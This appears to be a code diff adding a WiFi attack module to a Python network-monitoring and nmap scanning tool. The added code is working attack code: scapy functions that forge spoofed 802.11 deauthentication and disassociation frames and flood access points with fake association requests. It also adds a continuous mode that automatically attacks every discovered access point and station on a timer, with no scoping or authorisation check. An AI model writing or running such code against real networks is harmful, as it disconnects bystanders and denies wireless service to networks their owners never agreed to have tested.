@@ -18,7 +18,8 @@ import ipaddress
 
 import pandas as pd
 import pyshark
-from scapy.all import sniff, Raw
+from scapy.all import sniff, Raw, Dot11, Dot11Auth, Dot11AssoReq, Dot11AssoResp, Dot11Disas, Dot11Deauth, Dot11ProbeReq, Dot11ProbeResp, Dot11Beacon, RadioTap, sendp
+import random
 
 # --- Config ---
 WINDOW_SEC = 5
@@ -51,6 +52,16 @@ NMAP_VULN_ARGS = [
     "--script-args", "unsafe=1",
     "-sV", "-sC", "-T4", "--max-retries", "2"
 ]  # Comprehensive vulnerability scan
+
+# --- Association Attack Configuration ---
+ASSOCIATION_ATTACK_DIR = "/root/5t3wattacks"
+ASSOCIATION_TARGETS_FILE = os.path.join(ASSOCIATION_ATTACK_DIR, "attack_targets.json")
+ASSOCIATION_LOGS_FILE = os.path.join(ASSOCIATION_ATTACK_DIR, "attack_logs.json")
+
+# Attack parameters
+DEFAULT_ATTACK_INTERVAL = 5  # seconds between attacks
+DEFAULT_ATTACK_COUNT = 10    # number of frames per attack
+SUPPORTED_RATES = [0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]  # 802.11 supported rates
 
 # --- ARP Discovery ---
 def get_arp_table():
@@ -436,6 +447,396 @@ def generate_vulnerability_report():
         logging.error(f"Error generating vulnerability report: {e}")
         return None
 
+# --- Association Attack Functions ---
+def build_authentication_frame(destination_mac, source_mac, bssid, sequence_num=None):
+    """Build 802.11 authentication frame"""
+    if sequence_num is None:
+        sequence_num = random.randint(1, 4095)
+    
+    frame = RadioTap() / Dot11(
+        type=0, subtype=11,  # Management frame, Authentication
+        addr1=destination_mac,
+        addr2=source_mac,
+        addr3=bssid,
+        SC=sequence_num << 4
+    ) / Dot11Auth(
+        algo=0,  # Open System
+        seqnum=1,  # Authentication sequence number
+        status=0  # Success
+    )
+    return frame
+
+def build_association_request(ap_mac, client_mac, ssid, bssid=None, sequence_num=None):
+    """Build 802.11 association request frame"""
+    if bssid is None:
+        bssid = ap_mac
+    if sequence_num is None:
+        sequence_num = random.randint(1, 4095)
+    
+    # Import Dot11Elt here to avoid import issues
+    from scapy.all import Dot11Elt
+    
+    frame = RadioTap() / Dot11(
+        type=0, subtype=0,  # Management frame, Association Request
+        addr1=ap_mac,
+        addr2=client_mac,
+        addr3=bssid,
+        SC=sequence_num << 4
+    ) / Dot11AssoReq(
+        cap=0x1104,  # Capabilities
+        listen_interval=10
+    ) / Dot11Elt(ID="SSID", info=ssid) / Dot11Elt(ID="Rates", info=bytes(SUPPORTED_RATES))
+    return frame
+
+def build_association_response(client_mac, ap_mac, bssid=None, sequence_num=None):
+    """Build 802.11 association response frame"""
+    if bssid is None:
+        bssid = ap_mac
+    if sequence_num is None:
+        sequence_num = random.randint(1, 4095)
+    
+    # Import Dot11Elt here to avoid import issues
+    from scapy.all import Dot11Elt
+    
+    frame = RadioTap() / Dot11(
+        type=0, subtype=1,  # Management frame, Association Response
+        addr1=client_mac,
+        addr2=ap_mac,
+        addr3=bssid,
+        SC=sequence_num << 4
+    ) / Dot11AssoResp(
+        cap=0x1104,
+        status=0,  # Success
+        AID=1
+    ) / Dot11Elt(ID="Rates", info=bytes(SUPPORTED_RATES))
+    return frame
+
+def build_disassociation_frame(destination_mac, source_mac, bssid=None, reason=8, sequence_num=None):
+    """Build 802.11 disassociation frame"""
+    if bssid is None:
+        bssid = source_mac
+    if sequence_num is None:
+        sequence_num = random.randint(1, 4095)
+    
+    frame = RadioTap() / Dot11(
+        type=0, subtype=10,  # Management frame, Disassociation
+        addr1=destination_mac,
+        addr2=source_mac,
+        addr3=bssid,
+        SC=sequence_num << 4
+    ) / Dot11Disas(reason=reason)
+    return frame
+
+def build_deauthentication_frame(destination_mac, source_mac, bssid=None, reason=7, sequence_num=None):
+    """Build 802.11 deauthentication frame"""
+    if bssid is None:
+        bssid = source_mac
+    if sequence_num is None:
+        sequence_num = random.randint(1, 4095)
+    
+    frame = RadioTap() / Dot11(
+        type=0, subtype=12,  # Management frame, Deauthentication
+        addr1=destination_mac,
+        addr2=source_mac,
+        addr3=bssid,
+        SC=sequence_num << 4
+    ) / Dot11Deauth(reason=reason)
+    return frame
+
+def build_probe_request(source_mac, ssid="", bssid="ff:ff:ff:ff:ff:ff", sequence_num=None):
+    """Build 802.11 probe request frame"""
+    if sequence_num is None:
+        sequence_num = random.randint(1, 4095)
+    
+    # Import Dot11Elt here to avoid import issues
+    from scapy.all import Dot11Elt
+    
+    frame = RadioTap() / Dot11(
+        type=0, subtype=4,  # Management frame, Probe Request
+        addr1=bssid,  # Broadcast
+        addr2=source_mac,
+        addr3=bssid,
+        SC=sequence_num << 4
+    ) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info=ssid) / Dot11Elt(ID="Rates", info=bytes(SUPPORTED_RATES))
+    return frame
+
+def load_attack_targets():
+    """Load attack targets from file"""
+    try:
+        if os.path.exists(ASSOCIATION_TARGETS_FILE):
+            with open(ASSOCIATION_TARGETS_FILE, 'r') as f:
+                return json.load(f)
+        return {"targets": [], "last_updated": None}
+    except Exception as e:
+        logging.error(f"Error loading attack targets: {e}")
+        return {"targets": [], "last_updated": None}
+
+def save_attack_targets(targets_data):
+    """Save attack targets to file"""
+    try:
+        os.makedirs(ASSOCIATION_ATTACK_DIR, exist_ok=True)
+        with open(ASSOCIATION_TARGETS_FILE, 'w') as f:
+            json.dump(targets_data, f, indent=2)
+    except Exception as e:
+        logging.error(f"Error saving attack targets: {e}")
+
+def log_attack_activity(attack_type, target_mac, source_mac, status, details=""):
+    """Log attack activity for audit trail"""
+    try:
+        os.makedirs(ASSOCIATION_ATTACK_DIR, exist_ok=True)
+        
+        log_entry = {
+            "timestamp": datetime.now().isoformat(),
+            "attack_type": attack_type,
+            "target_mac": target_mac,
+            "source_mac": source_mac,
+            "status": status,
+            "details": details
+        }
+        
+        # Load existing logs
+        logs = []
+        if os.path.exists(ASSOCIATION_LOGS_FILE):
+            with open(ASSOCIATION_LOGS_FILE, 'r') as f:
+                logs = json.load(f)
+        
+        # Add new log entry
+        logs.append(log_entry)
+        
+        # Keep only last 1000 entries
+        if len(logs) > 1000:
+            logs = logs[-1000:]
+        
+        # Save updated logs
+        with open(ASSOCIATION_LOGS_FILE, 'w') as f:
+            json.dump(logs, f, indent=2)
+            
+    except Exception as e:
+        logging.error(f"Error logging attack activity: {e}")
+
+def perform_deauth_attack(interface, target_mac, ap_mac, count=10):
+    """Perform deauthentication attack"""
+    try:
+        logging.info(f"Starting deauth attack: {target_mac} <-> {ap_mac}")
+        
+        source_mac = get_interface_mac(interface)
+        frames_sent = 0
+        
+        for i in range(count):
+            # Deauth from AP to client
+            frame1 = build_deauthentication_frame(target_mac, ap_mac, ap_mac)
+            # Deauth from client to AP  
+            frame2 = build_deauthentication_frame(ap_mac, target_mac, ap_mac)
+            
+            try:
+                sendp(frame1, iface=interface, verbose=False)
+                sendp(frame2, iface=interface, verbose=False)
+                frames_sent += 2
+                time.sleep(0.1)
+            except Exception as e:
+                logging.error(f"Error sending deauth frame {i}: {e}")
+        
+        log_attack_activity("deauth", target_mac, source_mac, "completed", 
+                          f"Sent {frames_sent} deauth frames")
+        logging.info(f"Deauth attack completed: {frames_sent} frames sent")
+        return True
+        
+    except Exception as e:
+        logging.error(f"Deauth attack failed: {e}")
+        log_attack_activity("deauth", target_mac, source_mac, "failed", str(e))
+        return False
+
+def perform_disassoc_attack(interface, target_mac, ap_mac, count=10):
+    """Perform disassociation attack"""
+    try:
+        logging.info(f"Starting disassoc attack: {target_mac} <-> {ap_mac}")
+        
+        source_mac = get_interface_mac(interface)
+        frames_sent = 0
+        
+        for i in range(count):
+            # Disassoc from AP to client
+            frame1 = build_disassociation_frame(target_mac, ap_mac, ap_mac)
+            # Disassoc from client to AP
+            frame2 = build_disassociation_frame(ap_mac, target_mac, ap_mac)
+            
+            try:
+                sendp(frame1, iface=interface, verbose=False)
+                sendp(frame2, iface=interface, verbose=False)
+                frames_sent += 2
+                time.sleep(0.1)
+            except Exception as e:
+                logging.error(f"Error sending disassoc frame {i}: {e}")
+        
+        log_attack_activity("disassoc", target_mac, source_mac, "completed",
+                          f"Sent {frames_sent} disassoc frames")
+        logging.info(f"Disassoc attack completed: {frames_sent} frames sent")
+        return True
+        
+    except Exception as e:
+        logging.error(f"Disassoc attack failed: {e}")
+        log_attack_activity("disassoc", target_mac, source_mac, "failed", str(e))
+        return False
+
+def perform_association_flood(interface, ap_mac, ssid, count=50):
+    """Perform association request flood attack"""
+    try:
+        logging.info(f"Starting association flood attack on {ap_mac} ({ssid})")
+        
+        source_mac = get_interface_mac(interface)
+        frames_sent = 0
+        
+        for i in range(count):
+            # Generate random client MAC
+            fake_client = "02:00:00:{:02x}:{:02x}:{:02x}".format(
+                random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)
+            )
+            
+            try:
+                # Send auth frame first
+                auth_frame = build_authentication_frame(ap_mac, fake_client, ap_mac)
+                sendp(auth_frame, iface=interface, verbose=False)
+                
+                # Send association request
+                assoc_frame = build_association_request(ap_mac, fake_client, ssid)
+                sendp(assoc_frame, iface=interface, verbose=False)
+                
+                frames_sent += 2
+                time.sleep(0.05)
+                
+            except Exception as e:
+                logging.error(f"Error sending association frame {i}: {e}")
+        
+        log_attack_activity("assoc_flood", ap_mac, source_mac, "completed",
+                          f"Sent {frames_sent} association frames")
+        logging.info(f"Association flood completed: {frames_sent} frames sent")
+        return True
+        
+    except Exception as e:
+        logging.error(f"Association flood failed: {e}")
+        log_attack_activity("assoc_flood", ap_mac, source_mac, "failed", str(e))
+        return False
+
+def get_interface_mac(interface):
+    """Get MAC address of interface"""
+    try:
+        import netifaces
+        return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
+    except:
+        # Fallback method
+        try:
+            result = subprocess.run(['ip', 'link', 'show', interface], 
+                                  capture_output=True, text=True)
+            for line in result.stdout.split('\n'):
+                if 'link/ether' in line:
+                    return line.split()[1]
+        except:
+            pass
+        return "02:00:00:00:00:01"  # Default fallback MAC
+
+def discover_attack_targets():
+    """Discover potential attack targets from monitoring data"""
+    targets = []
+    
+    # Use existing station and AP tracking
+    for ap in access_points:
+        if ap and ap != "Unknown":
+            targets.append({
+                "type": "ap",
+                "mac": ap,
+                "ssid": "",  # Would need to track this separately
+                "channel": 0,  # Would need to track this
+                "signal": 0,
+                "last_seen": datetime.now().isoformat()
+            })
+    
+    for station in stations:
+        if station and station != "Unknown":
+            targets.append({
+                "type": "station", 
+                "mac": station,
+                "associated_ap": "",  # Would need to track this
+                "last_seen": datetime.now().isoformat()
+            })
+    
+    return targets
+
+def run_association_attacks(interface, attack_types=None, target_mac=None, ap_mac=None, ssid="", count=10):
+    """Run association-based attacks"""
+    if attack_types is None:
+        attack_types = ["deauth"]
+    
+    logging.info(f"Starting association attacks: {', '.join(attack_types)}")
+    
+    success_count = 0
+    total_attacks = len(attack_types)
+    
+    for attack_type in attack_types:
+        try:
+            if attack_type == "deauth" and target_mac and ap_mac:
+                success = perform_deauth_attack(interface, target_mac, ap_mac, count)
+            elif attack_type == "disassoc" and target_mac and ap_mac:
+                success = perform_disassoc_attack(interface, target_mac, ap_mac, count)
+            elif attack_type == "assoc_flood" and ap_mac:
+                success = perform_association_flood(interface, ap_mac, ssid, count)
+            else:
+                logging.warning(f"Skipping {attack_type}: missing required parameters")
+                continue
+                
+            if success:
+                success_count += 1
+                
+            # Wait between attacks
+            time.sleep(2)
+            
+        except Exception as e:
+            logging.error(f"Attack {attack_type} failed: {e}")
+    
+    logging.info(f"Association attacks completed: {success_count}/{total_attacks} successful")
+    return success_count > 0
+
+def continuous_association_attacks(interface, interval_minutes=10, attack_types=None):
+    """Continuously run association attacks at specified interval"""
+    if attack_types is None:
+        attack_types = ["deauth"]
+        
+    logging.info(f"Starting continuous association attacks (interval: {interval_minutes} minutes)")
+    
+    while True:
+        try:
+            # Discover current targets
+            targets = discover_attack_targets()
+            
+            if not targets:
+                logging.info("No attack targets found, waiting...")
+                time.sleep(interval_minutes * 60)
+                continue
+            
+            # Filter for APs and stations
+            aps = [t for t in targets if t["type"] == "ap"]
+            stations = [t for t in targets if t["type"] == "station"]
+            
+            # Perform attacks on discovered targets
+            for ap in aps[:3]:  # Limit to first 3 APs
+                for station in stations[:5]:  # Limit to first 5 stations
+                    run_association_attacks(
+                        interface, 
+                        attack_types=attack_types,
+                        target_mac=station["mac"],
+                        ap_mac=ap["mac"],
+                        count=5  # Reduced count for continuous mode
+                    )
+                    time.sleep(5)  # Wait between target pairs
+            
+            time.sleep(interval_minutes * 60)
+            
+        except KeyboardInterrupt:
+            logging.info("Continuous association attacks stopped by user")
+            break
+        except Exception as e:
+            logging.error(f"Error in continuous association attacks: {e}")
+            time.sleep(60)
+
 def continuous_port_scanning(interval_minutes=30):
     """Continuously scan for new clients at specified interval"""
     logging.info(f"Starting continuous port scanning (interval: {interval_minutes} minutes)")
@@ -723,6 +1124,24 @@ if __name__ == "__main__":
                         help="Directory to save vulnerability scan reports")
     parser.add_argument("--generate-vuln-report", action="store_true",
                         help="Generate vulnerability report from existing scan data and exit")
+    parser.add_argument("--association-attack", action="store_true",
+                        help="Enable WiFi association attacks (deauth, disassoc, etc.)")
+    parser.add_argument("--attack-types", type=str, default="deauth",
+                        help="Types of attacks to perform: deauth,disassoc,assoc_flood (comma-separated)")
+    parser.add_argument("--attack-target", type=str,
+                        help="Target MAC address for attacks")
+    parser.add_argument("--attack-ap", type=str,
+                        help="AP MAC address for attacks")
+    parser.add_argument("--attack-ssid", type=str, default="",
+                        help="SSID for association flood attacks")
+    parser.add_argument("--attack-count", type=int, default=10,
+                        help="Number of attack frames to send (default: 10)")
+    parser.add_argument("--attack-interval", type=int, default=10,
+                        help="Interval in minutes for continuous attacks (default: 10)")
+    parser.add_argument("--attack-once", action="store_true",
+                        help="Perform single attack and exit")
+    parser.add_argument("--attack-logs-dir", type=str, default="/root/5t3wattacks",
+                        help="Directory to save attack logs")
     args = parser.parse_args()
 
     if os.geteuid() != 0:
@@ -739,6 +1158,35 @@ if __name__ == "__main__":
     VULN_REPORTS_DIR = args.vuln_reports_dir
     VULN_SCANNED_IPS_FILE = os.path.join(VULN_REPORTS_DIR, "vuln_scanned_ips.json")
     VULN_SUMMARY_FILE = os.path.join(VULN_REPORTS_DIR, "vulnerability_summary.json")
+    
+    # Update global association attack directory
+    ASSOCIATION_ATTACK_DIR = args.attack_logs_dir
+    ASSOCIATION_TARGETS_FILE = os.path.join(ASSOCIATION_ATTACK_DIR, "attack_targets.json")
+    ASSOCIATION_LOGS_FILE = os.path.join(ASSOCIATION_ATTACK_DIR, "attack_logs.json")
+
+    # Handle association attack modes
+    if args.attack_once:
+        if not args.association_attack:
+            logging.error("--attack-once requires --association-attack flag")
+            exit(1)
+        
+        attack_types = [t.strip() for t in args.attack_types.split(',')]
+        logging.info("Performing single association attack...")
+        
+        success = run_association_attacks(
+            args.monitor_iface,
+            attack_types=attack_types,
+            target_mac=args.attack_target,
+            ap_mac=args.attack_ap,
+            ssid=args.attack_ssid,
+            count=args.attack_count
+        )
+        
+        if success:
+            logging.info("Association attack completed successfully, exiting.")
+        else:
+            logging.error("Association attack failed, exiting.")
+        exit()
 
     # Handle vulnerability scanning modes
     if args.vuln_scan_once:
@@ -767,6 +1215,13 @@ if __name__ == "__main__":
         t_vuln_scan = threading.Thread(target=continuous_vulnerability_scanning, 
                                        args=(args.vuln_scan_interval,), daemon=True)
         t_vuln_scan.start()
+    
+    if args.association_attack:
+        attack_types = [t.strip() for t in args.attack_types.split(',')]
+        logging.info(f"Starting continuous association attacks with {args.attack_interval} minute intervals")
+        t_assoc_attack = threading.Thread(target=continuous_association_attacks,
+                                         args=(args.monitor_iface, args.attack_interval, attack_types), daemon=True)
+        t_assoc_attack.start()
     
     if args.port_scan:
         logging.info(f"Starting continuous port scanning with {args.scan_interval} minute intervals")
